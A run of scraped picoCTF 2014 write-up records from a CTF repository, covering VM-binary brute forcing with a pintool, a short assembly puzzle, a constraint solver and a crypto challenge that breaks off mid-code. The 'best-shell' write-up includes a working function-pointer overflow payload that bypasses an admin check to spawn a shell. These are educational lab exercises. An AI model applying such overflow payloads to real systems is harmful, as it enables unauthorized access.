\n\n```bash\n#!/bin/bash\n\nexpected=0\nknown=\"\"\n\nfor j in `seq 0 30`; do \n    for i in `seq 33 127`; do\n        guess1=`printf \"\\x$(printf %x $i)\"`\n        guess2=`printf \"\\x$(printf %x $(($i+1)))\"`\n\n        if [[ -z $known ]]; then \n            pass1=\"${guess1}_____________________________\"\n            pass2=\"${guess2}_____________________________\"\n        else\n            pass1=\"${known}${guess1}\"\n            pass2=\"${known}${guess2}\"\n\n            padding=$((29-${#pass1}))\n            for j in `seq 0 $padding`; do \n                pass1=${pass1}\"_\"\n                pass2=${pass2}\"_\"\n            done\n        fi \n\n        ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"${pass1}\" > /dev/null 2>&1\n        count1=`cut -d' ' -f2 inscount.out | tr -d '\\n'`\n\n        ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"${pass2}\" > /dev/null 2>&1\n        count2=`cut -d' ' -f2 inscount.out | tr -d '\\n'`\n        diff=$(($count2-$count1))\n        echo \"diff between $pass1:${#pass1} and $pass2:${#pass2} = $diff ; known: $known\"\n\n        if [[ $diff -ne $expected ]]; then\n            echo \"$pass1 and $pass2 have different instruction count: $diff\"\n            known=${known}${guess2}\n            break\n        fi\n\n        pass1=\"${pass1}a\"\n        pass2=\"${pass2}a\"\n    done\ndone\n```\n\nLet's run it:\n\n```text\n# ./bale_brute.sh \ndiff between !_____________________________:30 and \"_____________________________:30 = 0 ; known: \ndiff between \"_____________________________:30 and #_____________________________:30 = 0 ; known: \ndiff between #_____________________________:30 and $_____________________________:30 = 0 ; known: \ndiff between $_____________________________:30 and %_____________________________:30 = 0 ; known: \ndiff between %_____________________________:30 and &_____________________________:30 = 0 ; known: \n.\n.\n.\ndiff between n_____________________________:30 and o_____________________________:30 = 0 ; known: \ndiff between o_____________________________:30 and p_____________________________:30 = -12 ; known: \no_____________________________ and p_____________________________ have different instruction count: -12\ndiff between p!____________________________:30 and p\"____________________________:30 = 0 ; known: p\ndiff between p\"____________________________:30 and p#____________________________:30 = 0 ; known: p\n.\n.\n.\ndiff between paa___________________________:30 and pab___________________________:30 = 0 ; known: pa\ndiff between pab___________________________:30 and pac___________________________:30 = -12 ; known: pa\npab___________________________ and pac___________________________ have different instruction count: -12\ndiff between pac!__________________________:30 and pac\"__________________________:30 = 0 ; known: pac\ndiff between pac\"__________________________:30 and pac#__________________________:30 = 0 ; known: pac\n.\n.\n.\ndiff between packc_________________________:30 and packd_________________________:30 = 0 ; known: pack\ndiff between packd_________________________:30 and packe_________________________:30 = -12 ; known: pack\npackd_________________________ and packe_________________________ have different instruction count: -12\ndiff between packe!________________________:30 and packe\"________________________:30 = 0 ; known: packe\ndiff between packe\"________________________:30 and packe#________________________:30 = 0 ; known: packe\n.\n.\n.\ndiff between packers_and_vms_and_xors_oh_mv:30 and packers_and_vms_and_xors_oh_mw:30 = 0 ; known: packers_and_vms_and_xors_oh_m\ndiff between packers_and_vms_and_xors_oh_mw:30 and packers_and_vms_and_xors_oh_mx:30 = 0 ; known: packers_and_vms_and_xors_oh_m\ndiff between packers_and_vms_and_xors_oh_mx:30 and packers_and_vms_and_xors_oh_my:30 = -2839 ; known: packers_and_vms_and_xors_oh_m\npackers_and_vms_and_xors_oh_mx and packers_and_vms_and_xors_oh_my have different instruction count: -2839\ndiff between packers_and_vms_and_xors_oh_my!:31 and packers_and_vms_and_xors_oh_my\":31 = 0 ; known: packers_and_vms_and_xors_oh_my\ndiff between packers_and_vms_and_xors_oh_my\":31 and packers_and_vms_and_xors_oh_my#:31 = 0 ; known: packers_and_vms_and_xors_oh_my\n\n```\n\nAs it finds each character, it prints it out under \"known\". After some time, we had \"packers_and_vms_and_xors_o\" and I just guessed the rest as \"oh_my\", which turned out to be correct. The flag is **packers_and_vms_and_xors_oh_my**\n\n\n#### The not-so smart way...\n\nbarrebas here, enlightening you on the idiot way of solving baleful. The pseudocode generated by Hopper and other tools was nigh unreadable. We quickly identified that we were up against some kind of virtual machine and that bytecode instructions are being processed by the assembly. The instructions were decoded and then control was handed of the appropriate assembly code here:\n\n```\n   0x8048a44:\tmov    eax,DWORD PTR [eax*4+0x8049dd4]\n   0x8048a4b:\tjmp    eax\n   0x8048a4d:\tadd    DWORD PTR [ebp-0x34],0x1\n```\n\nThe `jmp eax` then jumps to the correct block of assembly to handle that virtual machine instruction. \n\nsuperkojiman told me that the password was 30 characters, and so I tried to identify the chunks of code that were operating on the password. First, I thought I'd step throught the code with `gdb`, but as superkojiman already showed, more than 40,000 instructions were executed. Not gonna do that manually! Instead, I used some python magic with gdb to dump the contents of `eax` at `0x8048a4b`:\n\n```python\nclass DebugPrintingBreakpoint(gdb.Breakpoint):\n    def stop(self):\n\t\twith open('calls', 'a') as f:\n\t\t\tf.write(\"call: {}\\n\".format(gdb.parse_and_eval(\"$eax\")))\n\t\t\tf.close()\n\t\treturn False # do not drop to gdb's prompt\n\t\t\nwith open('calls', 'w') as f:\n\tf.write('starting to trace baleful\\n')\n\tf.close()\n\t\ngdb.execute(\"start\")\nDebugPrintingBreakpoint(\"*0x8048a4b\")\ngdb.execute(\"continue\")\n```\n\nThis could be ran from within `gdb` like so:\n\n```bash\ngdb-peda$ source baleful-dump.py\n```\n\nThe execution of the program will stop to ask for a password. I ran this script twice: once for a 0-length password and once for a 30-length password. This generated two files and with `sort | uniq` I was able to identify three addresses that were specific to the password-checking code:\n\n```\n0x8048a4d\n0x8048e2f\n0x80497b9\n```\n\nBacktracking throught the code, it seems that our chars are being mangled for comparison here;\n\n```\n   0x80499f6:\tsub    ecx,eax\n   0x80499f8:\tmov    eax,ecx\n   0x80499fa:\tmov    DWORD PTR [ebp-0x28],eax\n```\n\nThis value at 0x28 is later checked for NULL. I modified the python script to dump the contents of `ecx` at this postion:\n\n```python\nclass DebugPrintingBreakpoint(gdb.Breakpoint):\n    def stop(self):\n\t\twith open('ecx-values', 'a') as f:\n\t\t\tf.write(\"eax: {}\\n\".format(gdb.parse_and_eval(\"$eax\")))\n\t\t\tf.write(\"ecx: {}\\n\".format(gdb.parse_and_eval(\"$ecx\")))\n\t\t\tf.close()\n\t\treturn False # do not drop to gdb's prompt\n\nwith open('ecx-values', 'w') as f:\n\tf.write('starting to trace baleful\\n')\n\tf.close()\n\t\ngdb.execute(\"start\")\nDebugPrintingBreakpoint(\"*0x080499f6\")\ngdb.execute(\"continue\")\n```\n\nNow, this output contained two thousand of lines. Oops! It turns out that this virtual machine instruction is a generic \"subtract a from b\". Nevertheless, using the same trick as before (0 length password vs 30 length password) and by changing the supplied password a bit, I was able to find where the code started to compare the characters:\n\n```\neax: 0x8d\t# first char\necx: 0x8d\neax: 0x1e\t# check the length of the password\necx: 0x1\neax: 0x6f\t# second char\necx: 0x6f\t\neax: 0x1e\t# check the length of the password\necx: 0x2\neax: 0x0\t# third char\necx: 0x0\n```\n\nThrough some *ahem* guesswork, it looked like the first char is `p`. The second one was `a`. I guessed `c` and `k`. I continued, painstakingly, each time manually adjusting the guessed password and checking the output of the script. Turns out the flag looked like `packers_and_vms_and_xor`. Take would explain why I couldn't find a one-to-one relation between the characters I entered and the ones that ended up in the dumped file. With that in mind, I ran this piece of python to extract the xor key:\n\n```python\n>>> print [chr(ord(x) ^ ord(y)) for x,y in zip(\"packers\", \"\\x8d\\x6f\\x00\\x24\\x98\\x7c\")]\n['\\xfd', '\\x0e', 'c', 'O', '\\xfd', '\\x0e']\n```\n\nSo the values are xor’ed with these bytes. I grabbed the rest of the values:\n\n```python\n>>> print [chr(ord(x) ^ ord(y)) for x,y in zip(\"\\xfd\\x0ecO\"*10, \"\\x8d\\x6f\\x00\\x24\\x98\\x7c\\x10\\x10\\x9c\\x60\\x07\\x10\\x8b\\x63\\x10\\x10\\x9c\\x60\\x07\\x10\\x85\\x61\\x11\\x3c\\xa2\\x61\\x0b\\x10\\x90\\x77\")]\n['p', 'a', 'c', 'k', 'e', 'r', 's', '_', 'a', 'n', 'd', '_', 'v', 'm', 's', '_', 'a', 'n', 'd', '_', 'x', 'o', 'r', 's', '_', 'o', 'h', '_', 'm', 'y']\n```\n\nWhich turned out to be the flag, but I got it just seconds after superkojiman figured it out with the pintool. D'oh! Black-box reverse-engineering is painful!\n\n", "timestamp": "2025-10-24T11:40:14.319659"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/basic-asm.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/basic-asm.md", "content": "### Solved by superkojiman\n\nBasic ASM is a 60 point reverse engineering challenge. \n\n> We found this program snippet.txt, but we're having some trouble figuring it out. What's the value of %eax when the last instruction (the NOP) runs?\n\nThe provided snippets.txt shows the following assembly source code: \n\n```asm\n# This file is in AT&T syntax - see http://www.imada.sdu.dk/Courses/DM18/Litteratur/IntelnATT.htm\n# and http://en.wikipedia.org/wiki/X86_assembly_language#Syntax. Both gdb and objdump produce\n# AT&T syntax by default.\nMOV $119,%ebx\nMOV $28557,%eax\nMOV $8055,%ecx\nCMP %eax,%ebx\nJL L1\nJMP L2\nL1:\nIMUL %eax,%ebx\nADD %eax,%ebx\nMOV %ebx,%eax\nSUB %ecx,%eax\nJMP L3\nL2:\nIMUL %eax,%ebx\nSUB %eax,%ebx\nMOV %ebx,%eax\nADD %ecx,%eax\nL3:\nNOP\n```\n\nSo we need to find the value of EAX when the NOP is hit. The hint is to code it out in C, but there's no need for that. Just save the code in basic.s with a few small changes: \n\n```asm\n.global main\n.text\n\nmain:\n\nMOV $119,%ebx\nMOV $28557,%eax\nMOV $8055,%ecx\nCMP %eax,%ebx\nJL L1 \nJMP L2 \nL1:\nIMUL %eax,%ebx\nADD %eax,%ebx\nMOV %ebx,%eax\nSUB %ecx,%eax\nJMP L3 \nL2:\nIMUL %eax,%ebx\nSUB %eax,%ebx\nMOV %ebx,%eax\nADD %ecx,%eax\nL3:\nINT3    # <--- set a breakpoint here\nNOP\n```\n\nNext compile it with gcc: \n\n```\n# gcc - basic basic.s\n```\n\nRun in gdb and get the value of EAX, which is the flag:\n\n```\n# gdb ./basic -q -batch -n -ex 'r' -ex 'p $eax'\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x08048406 in L3 ()\n$1 = 3418785\n```\n\nThe flag is **3418785**\n", "timestamp": "2025-10-24T11:40:14.459568"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/best-shell.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/best-shell.md", "content": "### Solved by superkojiman\n\nBest Shell is a 160 point binary exploitation challenge. \n\n> This shell is super useful! See if you can get the flag! The binary can be found at /home/best_shell/ on the shell server. The source can be downloaded here.\n\nHere's the source code:\n\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdbool.h>\n#define NUMHANDLERS 6\n\ntypedef struct input_handler {\n    char cmd[32];\n    void (*handler)(char *);\n} input_handler;\n\nbool admin = false;\nchar admin_password[64];\ninput_handler handlers[NUMHANDLERS];\n\ninput_handler *find_handler(char *cmd){\n    int i;\n    for(i = 0; i < NUMHANDLERS; i++){\n        if (!strcmp(handlers[i].cmd, cmd)){\n            return &handlers[i];\n        }\n    }\n\n    return NULL;\n}\n\nvoid lol_handler(char *arg){\n    if (arg == NULL){\n        printf(\"usage: lol [string]\\n\");\n        return;\n    }\n\n    printf(\"lol %s\\n\", arg);\n}\n\nvoid add_handler(char *arg){\n    int arg1;\n    int arg2;\n\n    if (arg == NULL){\n        printf(\"usage: add [num1] [num2]\\n\");\n        return;\n    }\n\n    sscanf(arg, \"%d %d\", &arg1, &arg2);\n\n    printf(\"= %d\\n\", arg1 + arg2);\n}\n\nvoid mult_handler(char * arg){\n    int arg1;\n    int arg2;\n\n    if (arg == NULL){\n        printf(\"usage: mult [num1] [num2]\\n\");\n        return;\n    }\n\n    sscanf(arg, \"%d %d\", &arg1, &arg2);\n\n    printf(\"= %d\\n\", arg1 * arg2);\n}\n\nvoid rename_handler(char *arg){\n    char *existing;\n    char *new;\n\n    if (arg == NULL){\n        printf(\"usage: rename [cmd_name] [new_name]\\n\");\n        return;\n    }\n\n    existing = strtok(arg, \" \");\n    new = strtok(NULL, \"\");\n\n    if (new == NULL){\n        printf(\"usage: rename [cmd_name] [new_name]\\n\");\n        return;\n    }\n\n    input_handler *found = find_handler(existing);\n\n    if (found != NULL){\n        strcpy(found->cmd, new);\n    }else{\n        printf(\"No command found.\\n\");\n    }\n}\n\nvoid auth_admin_handler(char *arg){\n    if (arg == NULL){\n        printf(\"usage: auth [password]\\n\");\n        return;\n    }\n\n    if (!strcmp(arg, admin_password)){\n        admin = true;\n        printf(\"You are now admin!\\n\");\n    }else{\n        printf(\"Incorrect password!\\n\");\n    }\n}\n\nvoid shell_handler(char *arg){\n    if (admin){\n        gid_t gid = getegid();\n        setresgid(gid, gid, gid);\n        system(\"/bin/sh\");\n    }else{\n        printf(\"You must be admin!\\n\");\n    }\n}\n\nvoid setup_handlers(){\n    handlers[0] = (input_handler){\"shell\", shell_handler};\n    handlers[1] = (input_handler){\"auth\", auth_admin_handler};\n    handlers[2] = (input_handler){\"rename\", rename_handler};\n    handlers[3] = (input_handler){\"add\", add_handler};\n    handlers[4] = (input_handler){\"mult\", mult_handler};\n    handlers[5] = (input_handler){\"lol\", lol_handler};\n}\n\nvoid input_loop(){\n    char input_buf[128];\n    char *cmd;\n    char *arg;\n    input_handler *handler;\n\n    printf(\">> \");\n    fflush(stdout);\n    while(fgets(input_buf, 128, stdin)){\n        cmd = strtok(input_buf, \" \\n\");\n        arg  = strtok(NULL, \"\\n\");\n\n         handler = find_handler(cmd);\n\n         if (handler != NULL){\n             handler->handler(arg);\n         }else{\n             printf(\"Command \\\"%s\\\" not found!\\n\", cmd);\n         }\n\n        printf(\">> \");\n        fflush(stdout);\n    }\n}\n\nint main(int argc, char **argv){\n    FILE *f = fopen(\"/home/best_shell/password.txt\",\"r\");\n    if (f == NULL){\n        printf(\"Cannot open password file\");\n        exit(1);\n    }\n\n    fgets(admin_password, 64, f);\n    admin_password[strcspn(admin_password, \"\\n\")] = '\\0';\n    fclose(f);\n\n    setup_handlers();\n    input_loop();\n\n    return 0;\n}\n```\n\nThis program accepts the following commands: shell, auth, rename, add, mult, and lol. Out of all these, the rename command allows us to overwrite the function pointer handler defined here:\n\n```c\ntypedef struct input_handler {\n    char cmd[32];\n    void (*handler)(char *);\n} input_handler;\n```\n\nThe rename command allows us to rename an existing command to whatever we like. There is no bounds checking done, which means if we provide more than 32 bytes for the new name, we can overwrite the funcion pointer handler with whatever address we like. Let's see it in action: \n\n```text\n# gdb -q best_shell\nReading symbols from /root/pico-ctf/bestshell/best_shell...(no debugging symbols found)...done.\ngdb-peda$ r\n>> rename lol AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x42424242 ('BBBB')\nEBX: 0xb7767ff4 --> 0x160d7c \nECX: 0x10 \nEDX: 0x0 \nESI: 0x0 \nEDI: 0x0 \nEBP: 0xbfe19938 --> 0xbfe19968 --> 0xbfe199e8 --> 0x0 \nESP: 0xbfe1988c --> 0x8048c31 (<input_loop+121>:    jmp    0x8048c46 <input_loop+142>)\nEIP: 0x42424242 ('BBBB')\nEFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x42424242\n[------------------------------------stack-------------------------------------]\n0000| 0xbfe1988c --> 0x8048c31 (<input_loop+121>:   jmp    0x8048c46 <input_loop+142>)\n0004| 0xbfe19890 --> 0x0 \n0008| 0xbfe19894 --> 0x8048ea5 --> 0x6f43000a ('\\n')\n0012| 0xbfe19898 --> 0xb7768440 --> 0xfbad2288 \n0016| 0xbfe1989c --> 0xa00d008 --> 0x0 \n0020| 0xbfe198a0 --> 0xbfe198b8 ('A' <repeats 12 times>, \"BBBB\")\n0024| 0xbfe198a4 ('A' <repeats 32 times>, \"BBBB\")\n0028| 0xbfe198a8 ('A' <repeats 28 times>, \"BBBB\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x42424242 in ?? ()\ngdb-peda$ \n```\n\nIt worked! I renamed the lol command to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB which overwrote the function pointer handler with the address 0x42424242. When I called the renamed lol command, it attempted to execute the instruction at 0x42424242. All we need to do is point it to an address we want, in this case, the shell command which should give us a shell on the server. Finding the address of shell_handler() is a matter of just disassembling it in gdb on the server:\n\n```\n(gdb) disas shell_handler\nDump of assembler code for function shell_handler:\n   0x080489c6 <+0>: push   %ebp\n   0x080489c7 <+1>: mov    %esp,%ebp\n   0x080489c9 <+3>: sub    $0x28,%esp\n   0x080489cc <+6>: movzbl 0x804b085,%eax\n   0x080489d3 <+13>:    test   %al,%al\n   0x080489d5 <+15>:    je     0x8048a06 <shell_handler+64>\n   0x080489d7 <+17>:    call   0x8048600 <getegid@plt>\n   0x080489dc <+22>:    mov    %eax,-0xc(%ebp)\n   0x080489df <+25>:    mov    -0xc(%ebp),%eax\n   0x080489e2 <+28>:    mov    %eax,0x8(%esp)\n   0x080489e6 <+32>:    mov    -0xc(%ebp),%eax\n   0x080489e9 <+35>:    mov    %eax,0x4(%esp)\n   0x080489ed <+39>:    mov    -0xc(%ebp),%eax\n   0x080489f0 <+42>:    mov    %eax,(%esp)\n   0x080489f3 <+45>:    call   0x80486a0 <setresgid@plt>\n   0x080489f8 <+50>:    movl   $0x8048ea3,(%esp)\n   0x080489ff <+57>:    call   0x8048630 <system@plt>\n   0x08048a04 <+62>:    jmp    0x8048a12 <shell_handler+76>\n   0x08048a06 <+64>:    movl   $0x8048eab,(%esp)\n   0x08048a0d <+71>:    call   0x8048620 <puts@plt>\n   0x08048a12 <+76>:    leave\n   0x08048a13 <+77>:    ret\nEnd of assembler dump.\n```\n\nHowever we don't want to jump into it directly since it first checks to see if we've authenticated successfully, and we haven't. So we'll set the address at 0x080489d7, which is the call to getegid(). The exploit then is to rename a command with 32 \"A\"s, followed by the address 0x080489d7, and then call that renamed function. \n\n```\npico1139@shell:~$ python -c 'import struct; print \"rename lol \" + \"A\"*32 + struct.pack(\"<I\", 0x80489d7) + \"\\n\" + \"A\"*32 + struct.pack(\"<I\", 0x80489d7)' > in.txt\n```\n\nWe just need to pipe in.txt into best_shell to get our shell: \n\n```\npico1139@shell:~$ cd /home/best_shell/\npico1139@shell:/home/best_shell$ id\nuid=11066(pico1139) gid=1017(picogroup) groups=1017(picogroup)\npico1139@shell:/home/best_shell$ (cat /home_users/pico1139/in.txt ; cat) | ./best_shell\n>> >> id\nuid=11066(pico1139) gid=1010(best_shell) groups=1017(picogroup)\ncat flag.txt\ngive_shell_was_useful\n```\n\nThe flag is **give_shell_was_useful**\n", "timestamp": "2025-10-24T11:40:14.676924"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/bit-puzzle.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/bit-puzzle.md", "content": "### Solved by barrebas\n\nThe last bastion of PicoCTF! `bitpuzzle` is a 32-bit ELF file. It asks for a string and first checks if the string is 32 bytes long. Then, it chops it up into four-byte chunks and does certain checks on each chunk, effectively constraining the values that are valid. In the end, if the string passes all checks, then that string is the flag. Looking at other flags, this probably limited our characterset to lowercase plus underscore. The first chuck-checking constraint was this:\n\n```bash\nEAX: 0x37363534 ('4567')\nEBX: 0xffffd21c (\"0123456789abcdefABCDEFGHIJKLMNOP\")\nECX: 0xffffffde \nEDX: 0x33323130 ('0123')\nESI: 0x0 \nEDI: 0x62613938 ('89ab')\nEBP: 0xffffd338 --> 0xffffd3b8 --> 0x0 \nESP: 0xffffd200 --> 0xffffd21c (\"0123456789abcdefABCDEFGHIJKLMNOP\")\nEIP: 0x804858e (lea    ebx,[edi+eax*1])\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048582:\tmov    edx,DWORD PTR [esp+0x1c]\n   0x8048586:\tmov    eax,DWORD PTR [esp+0x20]\n   0x804858a:\tmov    edi,DWORD PTR [esp+0x24]\n=> 0x804858e:\tlea    ebx,[edi+eax*1]\n   0x8048591:\tmov    ecx,0x0\n   0x8048596:\tcmp    ebx,0xc0dcdfce\n   0x804859c:\tjne    0x80485ad\n```\n\nSo for this first constraint, we see that `var2 + var3 == 0xc0dcdfce`. I stepped through the code and set `ebx` to the right value, allowing me to see the other checks. I wrote them down:\n\n```\n((b+c) & 0xffffffff) == 0xc0dcdfce\n((a+b) & 0xffffffff) == 0xd5d3dddc\n((a*3+b*5) & 0xffffffff) == 0x404a7666\n((a ^ d) & 0xffffffff) == 0x18030607\n((a & d) & 0xffffffff) == 0x666c6970\n((b * e) & 0xffffffff) == 0xb180902b\n((c * e) & 0xffffffff) == 0x3e436b5f\n((e * f*2) & 0xffffffff) == 0x5c483831\n((f & 0x70000000) & 0xffffffff) == 0x70000000\n((f / g) & 0xffffffff) == 1\n((f % g) & 0xffffffff) == 0xe000cec\n((e*3+i*2) & 0xffffffff) == 0x3726eb17\n((c*4+i*7) & 0xffffffff) == 0x8b0b922d\n((d+i*3) & 0xffffffff) == 0xb9cf9c91\n```\n\nWhat else can we infer? Well, since `a+b == 0xd5...`, `0xd5 - first char of a` must be within the ASCII range too. This allowed me to narrow down the values that were possible for the first three chunks of the flag. After messing with `python-constraint`, I started writing my own script. This first script uses python sets, and used just shy of 6 GB of memory; way too much for my poor laptop. I re-wrote the code to use just integer arithmetic. Below is the final script. It's super ugly, but it's late and I'm tired!\n\n```python\n#!/usr/bin/python\nimport itertools, string\n\ndef h(i):\n\ts = hex(i)[2:]\n\tz = \"\"\n\tz += chr(int(s[6:8], 16))\n\tz += chr(int(s[4:6], 16))\n\tz += chr(int(s[2:4], 16))\n\tz += chr(int(s[0:2], 16))\n\treturn z\n\t\ndef strToInt(s):\n\ti = 0\n\tfor x in s:\n\t\ti <<= 8\n\t\ti += ord(x)\n\treturn i\n\nprint \"[+] Generating potential strings...\"\nsz = [x for x in map(''.join, itertools.product(\"_\"+string.lowercase, repeat=4))]\n\nprint \"[+] Converting potential strings to ints...\"\nallowed = []\nfor s in sz:\n\tallowed.append(strToInt(s))\n\n\n\nprint \"[+] Brutef... Erm, Constraining...\"\n\nfor s1 in allowed:\n\ts2 = 0xd5d3dddc - s1\n\t# OK, so s2+s1 = 0xd0... so we know that that x1 = 0xd0-x2\n\t# For s1 starting with 61..7a (a-z), 0xd0 - x1 is 0x5b..0x74. \n\t# For s1 starting with 41..5a and 30..39, 0xd0 - x1 becomes too large!\n\t# Therefor, s2 must start with 0x5B .. 0x74 inclusive. \n\tif (s2 >= 0x5B000000) and (s2 < 0x75000000):\n\t\ts3 = 0xc0dcdfce - s2\n\t\t# The same applies for s3\n\t\tif (s3 >= 0x4c000000) and (s3 < 0x66000000):\n\t\t\t# This is another constraint\n\t\t\tif ( ((s1 * 3)&0xffffffff) + ((s2*5)&0xffffffff) & 0xffffffff) == 0x404a7666:\n\t\t\t\ts4 = 0x18030607 ^ s1\n\t\t\t\tif s4 in allowed:\n\t\t\t\t\tprint \"s1: {}\".format(hex(s1))\n\t\t\t\t\tprint \"s2: {}\".format(hex(s2))\n\t\t\t\t\tprint \"s3: {}\".format(hex(s3))\n\t\t\t\t\tprint \"s4: {}\".format(hex(s4))\n\t\t\t\t\tfor s5 in allowed:\n\t\t\t\t\t\tif ((s5 * s2)&0xffffffff) == 0xb180902b:\n\t\t\t\t\t\t\tif ((s5 * s3)&0xffffffff) == 0x3e436b5f:\n\t\t\t\t\t\t\t\tprint \"s5: {}\".format(hex(s5))\n\t\t\t\t\t\t\t\tfor s6 in allowed:\n\t\t\t\t\t\t\t\t\tif (s6 & 0x70000000) == 0x70000000:\n\t\t\t\t\t\t\t\t\t\t#problem.addConstraint(lambda e, f: ((e * f*2) & 0xffffffff) == 0x5c483831, (\"e\", \"f\"))\n\t\t\t\t\t\t\t\t\t\t#problem.addConstraint(lambda f: ((f & 0x70000000) & 0xffffffff) == 0x70000000, (\"f\"))\n\t\t\t\t\t\t\t\t\t\tif ((s5 + ((s6 * 2)&0xffffffff))&0xffffffff) == 0x5c483831:\n\t\t\t\t\t\t\t\t\t\t\tprint \"s6: {}\".format(hex(s6))\n\t\t\t\t\t\t\t\t\t\t\tfor s7 in allowed:\n\t\t\t\t\t\t\t\t\t\t\t\tif ((s6 / s7) & 0xffffffff) == 1:\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ((s6 % s7) & 0xffffffff) == 0xe000cec:\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint \"s7: {}\".format(hex(s7))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor s8 in allowed:\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t#((e*3+i*2) & 0xffffffff) == 0x3726eb17, (\"e\", \"i\"))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t#((c*4+i*7) & 0xffffffff) == 0x8b0b922d, (\"c\", \"i\"))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t#((d+i*3) & 0xffffffff) == 0xb9cf9c91, (\"d\", \"i\"))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (((s5 * 3)&0xffffffff)+((s8*2)&0xffffffff) & 0xffffffff) == 0x3726eb17:\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (((s3 * 4)&0xffffffff)+((s8*7)&0xffffffff) & 0xffffffff) == 0x8b0b922d:\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (((s4 * 1)&0xffffffff)+((s8*3)&0xffffffff) & 0xffffffff) == 0xb9cf9c91:\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint \"s8: {}\".format(hex(s8))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tprint \"The flag is: \"+h(s1)+h(s2)+h(s3)+h(s4)+h(s5)+h(s6)+h(s7)+h(s8)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\texit(0)\n\n```\n\nThe flag is `The flag is: solving_equations_is_lots_of_fun`. That was the last challenge done!\n", "timestamp": "2025-10-24T11:40:14.744638"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/block.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/block.md", "content": "### Solved by superkojiman\n\nBlock is a 130 point cryptography challenge. I should mention that crypto isn't my forte so my solution is probably not the most efficient. But hey, it worked. \n\n> Daedalus Corp has been using this script to encrypt it's data! We think this file contains a password to their command server. Can you crack it?\n\nWe're given two files; a file called encrypted, which contains the flag, and a python script block.py, which allows us to encrypt and decrypt files. \n\nHere's what block.py looks like \n\n```python\n#!/usr/bin/python2\nfrom sys import argv, exit\nimport struct\n\nSBoxes = [[15, 1, 7, 0, 9, 6, 2, 14, 11, 8, 5, 3, 12, 13, 4, 10], [3, 7, 8, 9, 11, 0, 15, 13, 4, 1, 10, 2, 14, 6, 12, 5], [4, 12, 9, 8, 5, 13, 11, 7, 6, 3, 10, 14, 15, 1, 2, 0], [2, 4, 10, 5, 7, 13, 1, 15, 0, 11, 3, 12, 14, 9, 8, 6], [3, 8, 0, 2, 13, 14, 5, 11, 9, 1, 7, 12, 4, 6, 10, 15], [14, 12, 7, 0, 11, 4, 13, 15, 10, 3, 8, 9, 2, 6, 1, 5]]\n\nSInvBoxes = [[3, 1, 6, 11, 14, 10, 5, 2, 9, 4, 15, 8, 12, 13, 7, 0], [5, 9, 11, 0, 8, 15, 13, 1, 2, 3, 10, 4, 14, 7, 12, 6], [15, 13, 14, 9, 0, 4, 8, 7, 3, 2, 10, 6, 1, 5, 11, 12], [8, 6, 0, 10, 1, 3, 15, 4, 14, 13, 2, 9, 11, 5, 12, 7], [2, 9, 3, 0, 12, 6, 13, 10, 1, 8, 14, 7, 11, 4, 5, 15], [3, 14, 12, 9, 5, 15, 13, 2, 10, 11, 8, 4, 1, 6, 0, 7]]\n\ndef S(block, SBoxes):\n    output = 0\n    for i in xrange(0, len(SBoxes)):\n        output |= SBoxes[i][(block >> 4*i) & 0b1111] << 4*i\n\n    return output\n\n\nPBox = [13, 3, 15, 23, 6, 5, 22, 21, 19, 1, 18, 17, 20, 10, 7, 8, 12, 2, 16, 9, 14, 0, 11, 4]\nPInvBox = [21, 9, 17, 1, 23, 5, 4, 14, 15, 19, 13, 22, 16, 0, 20, 2, 18, 11, 10, 8, 12, 7, 6, 3]\ndef permute(block, pbox):\n    output = 0\n    for i in xrange(24):\n        bit = (block >> pbox[i]) & 1\n        output |= (bit << i)\n    return output\n\ndef encrypt_data(data, key):\n    enc = \"\"\n    for i in xrange(0, len(data), 3):\n        block = int(data[i:i+3].encode('hex'), 16)\n\n        for j in xrange(0, 3):\n            block ^= key\n            block = S(block, SBoxes)\n            block = permute(block, PBox)\n\n        block ^= key\n\n        enc += (\"%06x\" % block).decode('hex')\n\n    return enc\n\ndef decrypt_data(data, key):\n    dec = \"\"\n    for i in xrange(0, len(data), 3):\n        block = int(data[i:i+3].encode('hex'), 16)\n\n        block ^= key\n        for j in xrange(0, 3):\n            block = permute(block, PInvBox)\n            block = S(block, SInvBoxes)\n            block ^= key\n\n        dec += (\"%06x\" % block).decode('hex')\n\n    return dec\n\ndef encrypt(data, key1, key2):\n    encrypted = encrypt_data(data, key1)\n    encrypted = encrypt_data(encrypted, key2)\n    